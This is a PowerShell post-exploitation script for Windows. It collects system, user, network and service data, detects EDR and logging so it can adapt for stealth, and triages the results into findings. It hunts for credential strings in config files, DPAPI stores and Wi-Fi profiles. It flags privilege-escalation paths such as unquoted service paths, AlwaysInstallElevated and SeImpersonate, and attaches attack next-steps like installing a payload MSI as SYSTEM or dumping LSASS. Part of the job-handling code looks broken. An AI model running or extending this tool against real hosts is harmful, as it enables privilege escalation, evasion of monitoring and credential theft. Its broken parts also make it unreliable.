<#
.SYNOPSIS
  enum_windows.ps1 - Elite post-exploitation enumeration & triage (Windows)

.DESCRIPTION
  Collect + TRIAGE: emits findings.json with severity and next-action per check.
  PowerShell/.NET native only - no third-party binaries on the endpoint.
  OPSEC-aware: detects Script Block Logging / EDR agents and adapts collection.
  Includes live progress bar and timeout protection.

.PARAMETER OutputDir
  Evidence directory (default: %TEMP%\enum_<UTC timestamp>)

.PARAMETER Quiet
  Suppress console progress output (OPSEC: no terminal noise)

.PARAMETER Checks
  Comma-separated subset of checks to run (e.g. "current_user,services_unquoted")

.PARAMETER Resume
  Skip checks whose output files already exist in OutputDir

.EXAMPLE
  PS> .\enum_windows.ps1 -Quiet -OutputDir C:\Windows\Temp\.cache_out

.NOTES
  Author: DeepHat | License: MIT
  Exit codes: 0 ok | 1 partial failure | 2 usage
#>
[CmdletBinding()]
param(
    [string]$OutputDir = (Join-Path $env:TEMP ("enum_" + (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ'))),
    [switch]$Quiet,
    [string]$Checks = '',
    [switch]$Resume,
    [int]$CheckTimeoutSec = 30
)

$ErrorActionPreference = 'SilentlyContinue'
$Ts       = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$Script:Fid = 0
$Script:Findings = New-Object System.Collections.Generic.List[string]
$Script:Ran = @{}
$Script:TotalChecks = 18 # Aproximação para a barra de progresso
$Script:CurrentCheck = 0
$Script:StartTime = Get-Date

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

# ==============================================================================
# Core machinery
# ==============================================================================
function Write-Log([string]$Msg) {
    if (-not $Quiet) { Write-Host "[*] $Msg" -ForegroundColor Cyan }
}

function Write-ProgressBar([string]$Activity, [int]$Current, [int]$Total) {
    if ($Quiet) { return }
    $percent = [math]::Round(($Current / $Total) * 100, 0)
    $elapsed = (Get-Date) - $Script:StartTime
    $timeStr = "{0:mm\:ss}" -f $elapsed
    Write-Progress -Activity $Activity `
                   -Status "Check $Current/$Total ($percent%) | Elapsed: $timeStr" `
                   -PercentComplete $percent
}

function Test-WantCheck([string]$Check) {
    if ([string]::IsNullOrWhiteSpace($Checks)) { return $true }
    return (",$Checks,").Contains(",$Check,")
}

function Get-Technique([string]$Check) {
    switch -Regex ($Check) {
        '^(system_info|patch_level|packages_audit)$'      { 'T1082' }
        '^(current_user|local_admins|local_users)$'       { 'T1087' }
        '^creds_files$'                                   { 'T1555' }
        '^(dpapi_candidates|wifi_profiles)$'              { 'T1552' }
        '^network_config$'                                { 'T1016' }
        '^listening_svcs$'                                { 'T1046' }
        '^arp_cache$'                                     { 'T1018' }
        '^services_unquoted$'                             { 'T1574.009' }
        '^writable_service_paths$'                        { 'T1574.011' }
        '^always_installelevated$'                        { 'T1548.002' }
        '^token_privileges$'                              { 'T1134' }
        '^scheduled_tasks$'                               { 'T1053.005' }
        '^defenses_state$'                                { 'T1562.001' }
        default                                           { 'T1082' }
    }
}

function Add-Finding([string]$Severity, [string]$Technique, [string]$Title, [string]$Next) {
    $Script:Fid++
    $o = [ordered]@{
        id        = ("F-04-{0:D2}" -f $Script:Fid)
        severity  = $Severity
        technique = $Technique
        title     = $Title
        next      = $Next
    }
    $Script:Findings.Add(($o | ConvertTo-Json -Compress))
}

function Save-Check([string]$Check, [scriptblock]$Block) {
    if (-not (Test-WantCheck $Check)) { return }
    if ($Resume -and $Script:Ran.ContainsKey($Check)) {
        Write-Log "Skip (resume): $Check"; return
    }
    if ($Script:Ran.ContainsKey($Check)) { return }

    $Script:CurrentCheck++
    Write-ProgressBar "Enum Windows" $Script:CurrentCheck $Script:TotalChecks
    Write-Log "Collecting: $Check"
    
    $outf = Join-Path $OutputDir "$Check.txt"
    $header = "### check=$Check host=$env:COMPUTERNAME ts=$Ts user=$env:USERNAME isAdmin=$([bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
    
    # Execução com Timeout
    $job = Start-Job -ScriptBlock {
        param($sb, $timeout)
        try {
            $result = & $sb
            return @{ Success = $true; Data = ($result | Out-String) }
        } catch {
            return @{ Success = $false; Data = "### error: $_" }
        }
    } -ArgumentList $Block, $CheckTimeoutSec

    # Aguarda com timeout
    $completed = $job | Wait-Any -Timeout $CheckTimeoutSec
    if (-not $completed) {
        $job | Remove-Job -Force
        $data = "### timeout: check took longer than ${CheckTimeoutSec}s"
    } else {
        $res = $job | Receive-Job
        $job | Remove-Job -Force
        if ($res.Success) { $data = $res.Data } else { $data = $res.Data }
    }

    Set-Content -Path $outf -Value "$header`n$data" -Encoding UTF8
    $Script:Ran[$Check] = $true

    [ordered]@{ check = $Check; technique = (Get-Technique $Check); file = "$Check.txt"; ts = $Ts } |
        ConvertTo-Json -Compress | Add-Content -Path (Join-Path $OutputDir 'manifest.jsonl')

    # triage hook
    $tri = Get-Command "triage_$Check" -ErrorAction SilentlyContinue
    if ($tri) { try { & $tri.FullName $outf } catch { } }
}

# ==============================================================================
# Environment awareness: who is watching? (log the decision, adapt behavior)
# ==============================================================================
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$EnvInfo = [ordered]@{
    ts         = $Ts
    isAdmin    = $IsAdmin
    os         = (Get-CimInstance Win32_OperatingSystem).Caption
    psVersion  = $PSVersionTable.PSVersion.ToString()
    monitored  = $false
    monitor_src = @()
}

# Script Block Logging active? -> PowerShell collection is high-signal
$sbl = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue
if ($sbl -and $sbl.EnableScriptBlockLogging -eq 1) {
    $EnvInfo.monitor_src += 'scriptblock_logging'
    $EnvInfo.monitored = $true
}
# AV / EDR agents in process space
$EdrProcs = 'MsMpEng|CrowdStrike|CSFalcon|Sentinel|CarbonBlack|Defender|Elastic|Sysmon|edr|xdr'
$procs = Get-Process | Where-Object { $_.ProcessName -match $EdrProcs } | Select-Object -ExpandProperty ProcessName -Unique
if ($procs) {
    $EnvInfo.monitor_src += $procs
    $EnvInfo.monitored = $true
}
# Sysmon service present?
$svcSysmon = Get-Service -Name 'Sysmon*' -ErrorAction SilentlyContinue
if ($svcSysmon) { $EnvInfo.monitor_src += 'sysmon_service'; $EnvInfo.monitored = $true }

$EnvInfo | ConvertTo-Json | Set-Content -Path (Join-Path $OutputDir 'environment.json') -Encoding UTF8

if ($EnvInfo.monitored -and -not $Quiet) {
    Write-Log "ATENCAO: monitoring detected ($($EnvInfo.monitor_src -join ', ')). PowerShell cmdlet names will land in Event 4104."
}

# ==============================================================================
# Embedded knowledge bases (offline triage)
# ==============================================================================
$PrivEscPrivs = @(
    'SeDebugPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 
    'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeImpersonatePrivilege', 
    'SeAssignPrimaryTokenPrivilege'
)

# ==============================================================================
# Triage analyzers - the "script that thinks"
# ==============================================================================
function triage_current_user([string]$File) {
    $raw = Get-Content $File -Raw
    foreach ($priv in $PrivEscPrivs) {
        if ($raw -match [regex]::Escape($priv)) {
            $next = switch -Regex ($priv) {
                'SeDebug|SeBackup|SeRestore|SeTakeOwnership' { 'dump SAM/SYSTEM via backup semantics or LSASS access (phase 05)' }
                'SeImpersonate|SeAssignPrimaryToken'          { 'potato family escalation - service account context confirmed' }
                'SeLoadDriver'                                { 'enumerate loadable vulnerable drivers (phase 05)' }
            }
            Add-Finding 'high' 'T1134' "$priv enabled for current user" $next
        }
    }
    if ($raw -match 'S-1-5-32-544' -or $raw -match 'Administrators') {
        Add-Finding 'medium' 'T1087' 'User is member of local Administrators group (UAC context applies)' 'check UAC level; high-integrity process?'
    }
}

function triage_always_installelevated([string]$File) {
    $raw = Get-Content $File -Raw
    if ($raw -match 'AlwaysInstallElevated\s*:\s*1') {
        Add-Finding 'critical' 'T1548.002' 'AlwaysInstallElevated enabled (HKLM and/or HKCU = 1)' 'msiexec /q /i payload.msi -> SYSTEM (verify BOTH hives = 1 first)'
    }
}

function triage_services_unquoted([string]$File) {
    $raw = Get-Content $File -Raw
    foreach ($line in ($raw -split "`n" | Where-Object { $_.Trim() })) {
        if ($line -match '([A-Za-z]:\\[^\r\n]*\s[^\r\n]*\.exe)' -and $line -notmatch '"') {
            $path = $Matches[1].Trim()
            Add-Finding 'high' 'T1574.009' "Unquoted service path: $path" "test writability of each path segment; place payload at first writable break"
        }
    }
}

function triage_writable_service_paths([string]$File) {
    $raw = Get-Content $File -Raw
    foreach ($line in ($raw -split "`n" | Where-Object { $_ -match 'WRITABLE' })) {
        Add-Finding 'high' 'T1574.011' ($line.Trim()) 'replace/implant service binary; restart service (needs start permission)'
    }
}

function triage_creds_files([string]$File) {
    $raw = Get-Content $File -Raw
    foreach ($line in ($raw -split "`n" | Where-Object { $_.Trim() -and $_ -match ':\s*\d+\s*:.*\w+' })) {
        $path = ($line -split ':')[0..1] -join ':'
        if ($path -match 'web\.config|appsettings|app\.config') {
            Add-Finding 'high' 'T1552.001' "Credential pattern in app config: $path" "read targeted lines only; validate format; do not exfil bulk"
        } else {
            Add-Finding 'medium' 'T1552.001' "Credential pattern match: $path" 'manual review'
        }
    }
}

function triage_wifi_profiles([string]$File) {
    $raw = Get-Content $File -Raw
    $n = ([regex]::Matches($raw, '(?m)^.*Profile\s*:\s*\S+')).Count
    if ($n -gt 0) {
        Add-Finding 'low' 'T1552' "$n WLAN profile(s) stored" "netsh wlan export profile key=clear reveals PSK (deferred; noisy)"
    }
}

function triage_defenses_state([string]$File) {
    $raw = Get-Content $File -Raw
    if ($raw -match 'RealTimeProtectionDisabled\s*:\s*True' -or $raw -match 'DisableRealtimeMonitoring\s*:\s*1') {
        Add-Finding 'info' 'T1562.001' 'Defender real-time protection disabled' 'execution freedom increased; document in OPSEC notes'
    }
}

function triage_local_users([string]$File) {
    $raw = Get-Content $File -Raw
    if ($raw -match '(?m)^\S+\s+(?:\d+)?\s+(?:Enabled|Disabled)') {
        $n = ([regex]::Matches($raw, '(?m)^\S+')).Count
        Add-Finding 'info' 'T1087' "$n local accounts enumerated" 'cross-reference admin group membership in phase 06'
    }
}

function triage_scheduled_tasks([string]$File) {
    $raw = Get-Content $File -Raw
    if ($raw -match 'SYSTEM\s+\S+.*\.exe') {
        Add-Finding 'medium' 'T1053.005' 'Scheduled task running as SYSTEM found' 'check task action path writability (T1574 chain)'
    }
}

# ==============================================================================
# Collection checks
# ==============================================================================
Save-Check 'system_info' {
    Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime | Format-List
    Get-CimInstance Win32_ComputerSystem  | Select-Object Manufacturer, Model, Domain | Format-List
}

Save-Check 'patch_level' {
    Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 15 HotFixID, InstalledOn
}

Save-Check 'current_user' {
    [Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, IsSystem, AuthenticationType | Format-List
    whoami /priv
    whoami /groups
}

Save-Check 'local_users' {
    # Otimizado: net user é muito mais rápido que ADSI
    net user 2>&1 | Select-String -Pattern '^[A-Za-z0-9_.-]+$' | ForEach-Object { $_.Line }
}

Save-Check 'local_admins' {
    # Otimizado: net localgroup é mais rápido que ADSI
    net localgroup Administrators 2>&1 | Select-String -Pattern '^[A-Za-z0-9_.-]+$' | ForEach-Object { $_.Line }
}

Save-Check 'creds_files' {
    # Otimizado: Limita pastas e profundidade
    $roots = @($env:USERPROFILE, $env:ProgramFiles, 'C:\inetpub\wwwroot') | Where-Object { Test-Path $_ }
    foreach ($r in $roots) {
        Get-ChildItem -Path $r -Recurse -Depth 3 -Include *.config,*.xml,*.ini,*.yml,*.properties -ErrorAction SilentlyContinue |
            Select-String -Pattern 'password|apikey|secret|connectionString' -List |
            Select-Object -First 25 | ForEach-Object { "$($_.Path):$($_.LineNumber):MATCH" }
    }
}

Save-Check 'dpapi_candidates' {
    Get-ChildItem "$env:APPDATA\Microsoft\Protect","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length
}

Save-Check 'wifi_profiles' {
    netsh wlan show profiles
}

Save-Check 'network_config' {
    Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer | Format-List
    Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object DestinationPrefix, NextHop, InterfaceAlias
}

Save-Check 'listening_svcs' {
    Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess | Sort-Object LocalPort
}

Save-Check 'arp_cache' {
    Get-NetNeighbor -State Reachable | Select-Object IPAddress, LinkLayerAddress, InterfaceAlias
}

Save-Check 'services_unquoted' {
    Get-CimInstance Win32_Service |
        Where-Object { $_.PathName -and $_.PathName -notmatch '"' -and $_.PathName -match '\s[A-Za-z]:\\|\\\s' -and $_.PathName -match '\s' } |
        Select-Object Name, PathName, StartMode, StartName | Format-List
}

Save-Check 'writable_service_paths' {
    # Otimizado: Verifica apenas caminhos existentes e usa Try/Catch para evitar travamentos em permissões
    Get-CimInstance Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
        $svc = $_.Name
        # Remove aspas iniciais e argumentos de linha de comando
        $raw = ($_.PathName -replace '^"([^"]+)"', '$1') -replace '\s+[-/].*$', ''
        
        if (Test-Path $raw) {
            $dir = Split-Path $raw
            # Tenta criar um arquivo temporário invisível para testar escrita
            $testFile = Join-Path $dir ("temp_enum_" + [guid]::NewGuid().ToString("N"))
            try {
                [IO.File]::WriteAllText($testFile, 'x')
                Remove-Item $testFile -Force
                "WRITABLE service=$svc dir=$dir bin=$raw"
            } catch {
                # Silently ignore if not writable
            }
        }
    }
}

Save-Check 'always_installelevated' {
    foreach ($hive in 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer','HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer') {
        $v = (Get-ItemProperty $hive -ErrorAction SilentlyContinue).AlwaysInstallElevated
        "${hive} : AlwaysInstallElevated = $v"
    }
}

Save-Check 'token_privileges' {
    whoami /priv
}

Save-Check 'scheduled_tasks' {
    # Otimizado: Filtra apenas tarefas ativas com executáveis
    Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | ForEach-Object {
        $a = ($_.Actions | Where-Object { $_.Execute })[0]
        if ($a) { "$($_.Principal.UserId)`t$($_.TaskName)`t$($a.Execute) $($a.Arguments)" }
    }
}

Save-Check 'defenses_state' {
    Get-MpComputerStatus 2>$null | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled | Format-List
    Get-Service WinDefend, Sysmon* -ErrorAction SilentlyContinue | Select-Object Name, Status, StartType
}

# ==============================================================================
# Finalize: findings.json (single source of truth, same schema as Linux variant)
# ==============================================================================

# Limpa a barra de progresso
Write-Progress -Activity "Enum Windows" -Completed

$summary = [ordered]@{
    generated = $Ts
    host      = $env:COMPUTERNAME
    isAdmin   = $IsAdmin
    monitored = $EnvInfo.monitored
    stealth   = ($EnvInfo.monitored)   # auto-adapt flag documented, mirrors Linux behavior
    findings  = $Script:Findings | ForEach-Object { $_ | ConvertFrom-Json }
}
$summary | ConvertTo-Json -Depth 4 | Set-Content -Path (Join-Path $OutputDir 'findings.json') -Encoding UTF8

# Self-audit: artifacts left on host
@("enum_windows.ps1 (this script)", $OutputDir) |
    Set-Content -Path (Join-Path $OutputDir 'cleanup_manifest.txt') -Encoding UTF8

$elapsedTotal = (Get-Date) - $Script:StartTime
Write-Log "Done. $($Script:Ran.Count) checks, $($Script:Fid) findings in $($elapsedTotal.TotalSeconds.ToString('F1'))s -> $(Join-Path $OutputDir 'findings.json')"
exit 0